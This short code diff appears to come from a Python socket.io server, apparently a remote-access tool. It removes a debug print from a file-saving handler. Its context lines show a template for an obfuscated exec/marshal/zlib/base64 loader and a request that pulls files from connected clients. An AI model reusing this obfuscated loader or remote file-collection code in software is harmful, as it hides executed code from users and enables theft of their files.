@@ -327,8 +327,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             self.sio.emit("download_file", {"uid": uid, "file_path": file_path})
 
     def save_file(self, sid, data):
-
-        print(data)
         if not os.path.isdir("files_saved"):
             os.makedirs("files_saved")
 
